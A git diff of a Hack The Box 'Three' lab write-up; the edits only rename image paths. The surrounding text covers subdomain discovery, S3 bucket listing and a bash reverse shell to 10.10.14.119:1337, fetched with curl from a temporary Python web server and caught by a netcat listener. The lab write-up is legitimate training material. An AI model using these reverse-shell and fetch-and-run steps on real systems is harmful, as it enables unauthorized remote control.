@@ -73,7 +73,7 @@ After editing the host file to map the IP to the domain, we can use Gobuster to 
 
 <figure><img src="../../../../.gitbook/assets/image (102) (3).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Answer: s3.thetoppers.htb
 
@@ -119,11 +119,11 @@ Answer: aws s3 ls
 
 Looking at the buckets with: `aws --endpoint=http://s3.thetoppers.htb s3 ls`
 
-<figure><img src="../../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 we can go into this further: `aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb`
 
-<figure><img src="../../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (4) (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 With this basic info we can see this would use PHP
 
@@ -154,7 +154,7 @@ Now lets make a revershell script
 bash -i >& /dev/tcp/10.10.14.119/1337 0>&1
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (16) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Going to open a netcat shell with `nc -nvlp 1337`&#x20;
 
@@ -162,7 +162,7 @@ Going to open a netcat shell with `nc -nvlp 1337`&#x20;
 
 Now open a temp webserver to pull our script from: `python3 -m http.server 8081`&#x20;
 
-<figure><img src="../../../../.gitbook/assets/image (11) (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>
 
 Now we can use curl to get our script onto the server and executing it:
 
